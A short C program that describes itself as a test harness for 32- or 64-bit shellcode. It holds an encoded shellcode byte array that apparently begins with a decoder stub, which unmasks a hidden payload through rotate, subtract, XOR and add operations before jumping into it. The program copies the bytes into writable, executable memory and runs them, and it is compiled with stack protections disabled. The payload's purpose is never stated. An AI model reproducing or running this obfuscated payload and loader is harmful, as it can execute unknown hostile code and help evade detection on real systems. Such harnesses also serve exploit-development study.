//#############################
//######## DESCRIPTION ########
//#############################

//C program to test the correct operation of a 32-bit or 64-bit shellcode

//#############################
//######## COMPILATION ########
//#############################

// gcc (-m32) -z execstack -fno-stack-protector -fno-pie -z norelro -fPIC testShellcode.c -o testShellcode

//#############################
//########## PROGRAM ##########
//#############################

#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

char shellcode[] = \
	"\xeb\x5c\x5e\x48\x31\xdb\x48\x31\xc9\x48"
	"\x31\xd2\xb1\x66\xfe\xc2\x80\xfa\x02\x74"
	"\x06\xc0\x0c\x1e\x03\xeb\x07\xc0\x0c\x1e"
	"\x05\x48\x31\xd2\x80\xc3\x01\x80\xe9\x01"
	"\x71\xe4\x48\x31\xdb\x48\x31\xc9\x48\x31"
	"\xd2\xb1\x66\xfe\xc2\x80\xfa\x02\x74\x0b"
	"\x80\xfa\x03\x74\x0c\x80\x2c\x1e\x0d\xeb"
	"\x0d\x80\x34\x1e\x07\xeb\x07\x80\x04\x1e"
	"\x12\x48\x31\xd2\x80\xc3\x01\x80\xe9\x01"
	"\x71\xd9\xff\xe6\xe8\x9f\xff\xff\xff\xab"
	"\x0f\x7f\xe2\x1b\x8a\xab\xaf\xba\x6e\x6b"
	"\x1e\xaa\xc6\x06\xaa\xb1\x9c\x6a\x36\x7f"
	"\xaa\xb1\xbd\x6a\x16\x87\xaa\xb1\xd5\xed"
	"\xc5\xef\x42\x7a\xe3\xfe\xb6\xff\xaa\x54"
	"\x44\x89\xe9\xbb\x9a\x7a\xe3\x6e\xf6\xc0"
	"\x83\x10\xc6\xf1\x3e\xf4\xc5\x40\x7e\x6a"
	"\x3f\xa5\xb7\x31\xbf\x90\xe8\x67\x7a\xbd"
	"\xe1\xe0\x40\xb1\x99\x41\xa3\x7b\xcd\xe2"
	"\x87\xa3\xca\xaa\xc6\x27\x6c\x82\xc6\xf1"
	"\xba\xb1\x53\xd9\x42\xaa\xc6\x75\xb7\xe1"
	"\xbf\x90";

void main() {
    printf("Shellcode length : %u\n", strlen(shellcode));
    
    void * a = mmap(0, sizeof(shellcode), PROT_EXEC | PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    ((void (*)(void)) memcpy(a, shellcode, sizeof(shellcode)))();
}
